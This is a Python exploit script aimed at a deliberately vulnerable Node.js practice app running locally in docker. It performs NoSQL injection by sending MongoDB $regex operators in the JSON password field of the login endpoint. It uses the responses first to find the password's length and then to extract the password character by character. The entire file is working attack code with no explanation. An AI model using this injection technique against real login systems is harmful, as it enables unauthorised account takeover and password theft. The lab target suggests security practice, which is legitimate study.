#!/usr/bin/python3
# git clone https://github.com/Charlie-belmer/vulnerable-node-app
# cd vulnerable-node-app
# docker-compose up -d

from pwn import *
import requests, time, sys, signal, string

LOGIN_URL = "http://localhost:4000/user/login"
CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def main():

    user = sys.argv[1]
    
    password = ""

    p1 = log.progress("Bruteforce")
    p1.status("Starting brute force process for user %s" % user)

    time.sleep(2)

    p2 = log.progress("Password length")
    

    length = 0
    testl = 1
    while not(length):
        post_data = '{"username":"%s","password":{"$regex":".{%d}"}}' % (user, testl)
        headers = {"Content-Type": "application/json"}
        
        r = requests.post(LOGIN_URL, headers=headers, data=post_data)
        if not("Logged in as user" in r.text):
            length = testl - 1
            p2.status(str(length))
            break
        testl += 1
    

    p3 = log.progress("Password text")
    for pos in range(0, length):
        for char in CHARS:

            post_data = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user, password, char)
            headers = {"Content-Type": "application/json"}
                        
            r = requests.post(LOGIN_URL, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += char
                p3.status("%s - %d/%d" % (password, pos + 1, length))
                #p2.status(password + " - " + str(pos + 1) + "/24")
                break


if __name__ == "__main__":
    main()
